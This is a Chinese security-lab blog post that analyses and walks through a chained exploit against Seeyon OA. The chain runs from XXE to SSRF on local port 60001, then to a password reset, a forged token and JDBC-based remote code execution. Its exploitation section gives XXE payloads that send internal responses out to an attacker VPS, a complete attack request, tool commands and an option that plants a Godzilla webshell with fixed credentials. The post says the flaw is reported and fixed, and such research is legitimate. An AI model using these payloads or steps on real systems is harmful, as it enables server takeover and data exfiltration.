#  【新】致远OA从前台XXE到RCE漏洞分析

原创 烽火台实验室  [ Beacon Tower Lab ](javascript:void\(0\);)

**Beacon Tower Lab** ![]()

微信号 WebRAY_BTL

功能介绍 "海上千烽火，沙中百战场"，烽火台实验室将为您持续输出前沿的安全攻防技术

____

___发表于_

收录于合集

**0x01 前言**

  

致远OA是目前国内最流行的OA系统之一，前几年也曾爆出过多个安全漏洞。致远官方一直对修复漏洞的态度十分积极，目前能有效利用的致远漏洞已经很少了。

  

和我们之前分享过的通达OA的漏洞类似，这类主流OA系统现在想要直接一步达到RCE的效果是非常困难的。今天跟大家分享一个通过组合漏洞方式来对致远OA进行RCE的案例，整个利用过程分成多个步骤，应该算是XXE漏洞的典型深入应用场景。

  

在今年8月的某攻防演练活动中笔者利用此漏洞拿到多个目标的边界权限，后续也将该漏洞也报送给了官方，目前已在新版本中修复。本文仅以安全研究为目的，分享对该漏洞的挖掘和分析过程，文中涉及的所有漏洞均已报送给国家单位，请勿用做非法用途。

  

 **0x02 XXE漏洞**

  

致远OA多个版本（A8, A8+,
A6）中均存在一个XXE漏洞，在com.kg.web.action.RunSignatureAction类中接收外部输入的参数xmlValue。

  *   *   *   *   *   *   *   *   * 

    
    
    info.setTextinfo(textinfo);String xml = ctx.getParameter("xmlValue", new String[0]);String signature = null;if (this.jsNotNull(xml)) {    signature = exec.runSignature(info, xml);} else {    String protectedData = this.getProtectedData(ctx);    signature = exec.runSignature(info, this.getProtectedDataList(protectedData));}

  

如果不为空，则进入runSignature方法。

  *   *   *   *   * 

    
    
    public String runSignature(KgSignatureInfo info, String protectedXml) {    List<KgProtectedData> data = this.xmlToList(protectedXml);    this.put(KgSignName.FIELDXML, protectedXml);    return this.runSignature(info, data);}

  

继续跟踪进入xmlToList方法。

  *   *   *   *   * 

    
    
    public List<KgProtectedData> xmlToList(String protectedXml) throws KgException {    ArrayList protectedDatas = new ArrayList();  
        try {        List<Element> s = this.getNodes(protectedXml, "/Signature/Field");

  

继续跟踪，进入getNodes方法，这里就是很明显的XXE漏洞位置。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    private List<Element> getNodes(String xmlString, String xpath) {    ArrayList tmpList = null;  
        try {        SAXReader saxReader = new SAXReader();        Reader xml_sr = new StringReader(xmlString);        saxReader.setEncoding("UTF-8");        Document document = saxReader.read(xml_sr);        if (document.getRootElement() == null) {            throw new KgException(new KgCommonsError("XmlParser Object hasn't RootElement.", KgCommonsError.SYSTEM_ERROR.getCode()));        } else {            List<?> contexts = document.selectNodes(xpath);            tmpList = new ArrayList();  
                for(int i = 0; i < contexts.size(); ++i) {                if (contexts.get(i) instanceof Element) {                    tmpList.add((Element)contexts.get(i));                }            }  
                return tmpList;        }    }

  

完整的payload如下，发送下面的请求，触发XXE的SSRF功能。相应内容如下代表存在漏洞。如图2.1所示

![]()

图2.1 存在SSRF漏洞的页面响应

![]()

图2.2 利用XXE产生SSRF请求

  

 **0x03 RCE漏洞**

  

在java环境下是不能直接通过XXE来执行系统命令的，并且这里的XXE是不具有回显的功能，仅能通过XXE来达到SSRF的效果，并且只能进行GET类型的请求。如何通过SSRF来达到RCE的效果是充分利用此漏洞的关键。

  

本人在分析致远的系统服务的过程中发现致远在某些情况下会开放60001端口，一般是监听在本地地址127.0.0.1的。服务是由一个名为agent.jar的包提供的服务，如图3.1所示。

![]()

图3.1 agent.jar开放的60001端口服务

  

在com.seeyon.agent.sfu.server.apps.configuration.controller.ConfigurationController类中定义了方法testDBConnect，如图3.2所示。

![]()

图3.2 testDBConnection方法定义

  

继续跟踪this.configurationManager.testDBConnect方法，如图3.3所示。这个方法的主要作用是用于测试数据库连接，并且允许自定义连接驱动类。

![]()

图3.3 允许自定义driverClass

  

在文章https://paper.seebug.org/1832/中详细介绍了基于JDBC Connection
URL的利用方法，其中最简单的是使用通过h2数据库来达到RCE效果，如图3.4所示。对原理感兴趣的小伙伴可以参考原文。

![]()

图3.4 通过H2数据库达到RCE效果

  

到这一步已经可以看出整个命令执行的大致逻辑是通过XXE来执行SSRF请求，通过SSRF访问致远60001端口中的testDBConnection方法，并且传递恶意的driverClass和dbUrl来达到RCE的效果。

  

然而现实情况下确远没有这么简单，直接访问上面的testDBConnection，会报“非法访问的错误”，如图3.5所示。

![]()

图3.5 直接访问testDBConnection报错

  

根据错误提示反向找到对应的逻辑代码com.seeyon.agent.common.interceptor.
SecurityInterceptor的preHandle方法，这应该是全局的拦截器，其中关键的代码如图3.6所示。

![]()

图3.6 根据错误提示反响找到验证代码逻辑

  

从这段代码中可以清晰的看出需要传入参数ad，并且有对ad参数进行有效校验的方法isChecktoken，跟踪isChecktoken方法。

![]()

图3.7 isChecktoken方法逻辑判断

  

isChecktoken方法很简单，其中tokenMap是静态属性，默认为空。需要找到为tokenMap赋值的办法。在这个逻辑卡了很久，很长一段时间都以为没办法利用，后来找到了一个可以为tokenMap写入数据的办法com.seeyon.agent.common.getway.getToken方法，如图3.8，图3.9所示。

![]()

图3.8 通过传入的seeyon参数进行AES解密获取字段

![]()

图3.9 生成token并响应token结果

  

跟踪生成token的TokenUtils.getToken方法，如图3.10所示。这里会生成一个随机的token名称，并保存到tokenMap的静态属性中，与图3.7需要的逻辑判断相呼应。

![]()

图3.10 生成token并保存到静态属性tokenMap中

  

但是这里还有两个问题需要处理，一个是图3.8中AES加密的密钥是多少，另一个是传入的参数signature如何进行签名验证。第一个问题需要跟踪AESUtil.Decrypt方法，如图3.11所示，密钥和偏移量iv都为0102030405060708，典型的硬编码问题。第二个问题是签名校验时只是把传入的参数进行sha1计算，然后比较值，如图3.12所示。

![]()

图3.11 通过硬编码实现的AES解密

![]()

图3.12 通过sha1签名进行校验

  

到这一步还是不能没有完全解决我们的问题，因为我们在图3.8说了需要传入的参数包括username、pwd和versions这些参数。那么这些参数是怎么来的呢？

1）username参数可以传默认存在的用户名seeyon

2）pwd参数我没有找到默认的值，但是找到了一个任意用户密码重置的接口（这里的用户并不是致远前台WEB的用户，而是60001接口对应的用户）。在com.seeyon.agent.common.controller.ConfigController类的modifyDefaultUserInfo方法中提供了重置用户密码的接口，并且不需要认证，如图3.13所示。

![]()

图3.13 通过modifyDefaultUserInfo方法来充值seeyon用户密码

  

3）versions参数也没有默认值，versions参数来源于当前目标系统版本，实际环境中可能存在多种不同的值2.1.0，2.3.4等都有可能。可以通过接口com.seeyon.agent.common.controller.VersionController类的getVersion方法获取，如图3.14所示。

![]()

图3.14 通过getVersion方法获取当前目标致远版本号

  

到目前为止就分析了完整的漏洞利用过程，整个过程分成多个步骤，漏洞利用过程比较复杂。

  

 **0x04 漏洞利用**

  

漏洞分析过程已经在上面的文章中体现了，整个流程还是非常复杂的，感兴趣的同学可以自己去复现。另外我把整个漏洞利用过程写成了一个简单的工具，并整理为下面的步骤。下载的工具解压之后如图4.1所示。

  

工具下载链接：

https://www.ddpoc.com/poc/DVB-2023-5278.html

  

![]()

图4.1 致远XXE综合利用工具

  

 _ **> Step1：**_

把124.xml、125.xml和126.xml上传到自己的vps上，并开启WEB访问。

  

 _ **> Step2：**_

修改124.xml文件中第二个请求的地址为自己的vps地址，如下所示。

  *   * 

    
    
    <!ENTITY % file SYSTEM "http://127.0.0.1:60001/agent/config/modifyDefaultUserInfo?pwd=TVRJek5EVTI="><!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://yourvps:yourport/123.php?p=%file;'>">

  

 _ **> Step3：**_

生成重置密码的POC，使用下面的命令，保证124.xml能正常访问到。

  * 

    
    
    java -cp seeyon.jar Main reset http://yourvps:yourport/124.xml

  

![]()

图4.2 生成重置密码POC

  

通过获取的payload，修改xmlValue字段的值。后续请求会多次利用下面的请求发起SSRF行为，后续简称SSRF请求。

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /seeyon/m-signature/RunSignature/run/getAjaxDataServlet?S=ajaxEdocSummaryManager&M=deleteUpdateObj HTTP/1.1Host: target.hostPragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 302  
    signatures=YWFh02JiYitY2M%3D&encode=true&elemId=YWFh&imgvalue=MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDVNVEl=&xmlValue={payload}

  

正常来说VPS部分会收到下面的请求，如图4.3所示。如果收到124.xml的请求代表目标存在XXE漏洞；如果收到123.php的请求代表可以对目标进行RCE。

![]()

图4.3 重置密码的服务端请求  

  

 _ **> Step4：**_

修改125.xml文件中第二个请求的地址为自己的vps地址，如下所示。

  *   * 

    
    
    <!ENTITY % file SYSTEM "http://127.0.0.1:60001/agent/version/getVersion"><!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://yourvps:yourport/123.php?p=%file;'>">

  

 _ **> Step5：**_

生成获取系统版本的POC，使用下面的命令，保证125.xml能正常访问到。

  * 

    
    
    java -cp seeyon.jar Main version http://yourvps:yourport/125.xml

  

![]()

图4.4 生成获取系统版本POC  

  

修改SSRF请求中的payload为生成的POC，发送请求，可以在服务器端查看获取到的版本信息，如图4.5所示。

![]()

图4.5 通过界面响应获取版本信息

  

 _ **> Step6：**_

生成获取param需要的POC，使用下面的命令，其中最后的版本替换为上一步获取的版本，如图4.6所示。  

  * 

    
    
    java -cp seeyon.jar Main param 2.0.8

  

![]()

图4.6 生成获取token需要的参数seeyon和signature

  

 _ **> Step7：**_  

修改126.xml文件中的内容，替换为自己地址，需要注意的是这里必须替换参数seeyon和signature中的值为上一步生成的值，如图4.7所示。

![]()

图4.7 修改126.xml文件中内容

  

 _ **> Step8：**_  

生成获取token需要的POC，使用下面的命令，如图4.8所示。

  * 

    
    
    java -cp seeyon.jar Main token http://yourvps:yourport/126.xml

  

![]()

图4.8 生成获取token需要的POC

  

修改SSRF请求中的payload为生成的POC，发送请求，可以在服务器端查看获取到的版本信息，如图4.9所示。  

![]()

图4.9 获取token

  

 _ **> Step9：**_  

生成最终利用的POC和EXP，使用下面的命令。其中token需要替换为上一步获取的token。

  * 

    
    
    java -cp seeyon.jar Main rce 26926456886553:7RU5MTY4OTc1NDg1NjI4OA==4AA test #探测漏洞 java -cp seeyon.jar Main rce 26926456886553:7RU5MTY4OTc1NDg1NjI4OA==4AA gsl #生成哥斯拉webshell

  

工具提供两种方式test和gsl，其中test在目标服务器上生成一个seeyon.txt的文件，对应的访问方式为http://www.target.com/seeyon.txt,仅用于测试目的；gsl在目标服务器上传哥斯拉webshell，对应的访问访问为http://www.target.com/logon.jsp
111/111。

![]()

图4.10 生成用于测试用的test POC

  

修改SSRF请求中的payload为生成的POC，发送请求。查看目标服务器的  

seeyon.txt文件，如图4.11所示。

![]()

图4.11 验证漏洞利用是否成功

  

 **0x05 结论**

  

由于这个漏洞已经在手里太长时间了，很多分析是一年以前写的，写这篇文章的时候并没有完整的跟踪整个漏洞，其中细节难免有疏忽，如有不对的地方欢迎大家给我们留言。结合上面的分析可以看出致远OA能RCE的前提条件包括：

  

1、目标服务器出网

2、目标致远开启了60001端口

  

第一个条件是很容易满足的，因为现在致远的服务器需要在线更新，所以基本上都是出网的；第二个条件不一定满足，从实网测绘数据来看约有1/3的致远OA是开启了这个端口的。

  

 _本文仅以提供技术交流为目的，所有漏洞均已上报相关单位，请勿将本文工具用于非法网络攻击目的。_

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

